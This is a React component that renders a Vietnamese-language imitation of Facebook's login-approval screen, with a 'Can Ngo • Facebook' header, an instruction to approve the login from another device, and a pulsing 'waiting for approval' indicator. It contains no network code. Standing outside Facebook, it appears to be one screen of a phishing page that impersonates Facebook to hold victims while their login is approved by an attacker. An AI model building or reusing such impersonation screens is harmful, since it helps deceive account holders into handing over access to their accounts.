import React from 'react';
import { motion } from 'framer-motion';
import { MoreHorizontal, HelpCircle } from 'lucide-react';

const WaitingForApprovalScreen = () => {
    return (
        <motion.div
            key="waitingForApproval"
            className="w-full h-full bg-white/95 backdrop-blur-sm text-black rounded-lg shadow-xl p-6 sm:p-8 flex flex-col items-start justify-center border border-white/20"
        >
            <div className="w-full flex justify-between items-center mb-3">
                <p className="text-sm font-semibold text-gray-800">Can Ngo • Facebook</p>
                <HelpCircle className="w-6 h-6 text-gray-500" />
            </div>

            <div className="w-full text-left mt-3">
                <h2 className="text-2xl font-bold text-gray-900 mb-2">
                    Kiểm tra thông báo trên thiết bị khác
                </h2>
                <p className="text-gray-600 text-sm mb-4">
                    Truy cập tài khoản Facebook của bạn trên một thiết bị khác và mở thông báo chúng tôi đã gửi để phê duyệt lần đăng nhập này.
                </p>
            </div>

            <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ type: "spring", stiffness: 100, damping: 20, delay: 0.2 }}
                className="my-3 w-full"
            >
                <img  alt="Minh họa xác thực đăng nhập an toàn giữa điện thoại và laptop" class="w-full max-w-xs sm:max-w-sm mx-auto rounded-lg" src="https://images.unsplash.com/photo-1661229978118-fc02b873bdaf" />
            </motion.div>

            <div className="flex items-center text-gray-800 mt-4">
                <div className="w-10 h-10 rounded-full border-2 border-gray-400 flex items-center justify-center mr-4">
                    <MoreHorizontal className="w-6 h-6 animate-pulse" />
                </div>
                <div>
                    <p className="font-semibold">Đang chờ phê duyệt</p>
                    <p className="text-xs text-gray-500">
                        Phê duyệt từ thiết bị khác để tiếp tục.
                    </p>
                </div>
            </div>
        </motion.div>
    );
};

export default WaitingForApprovalScreen;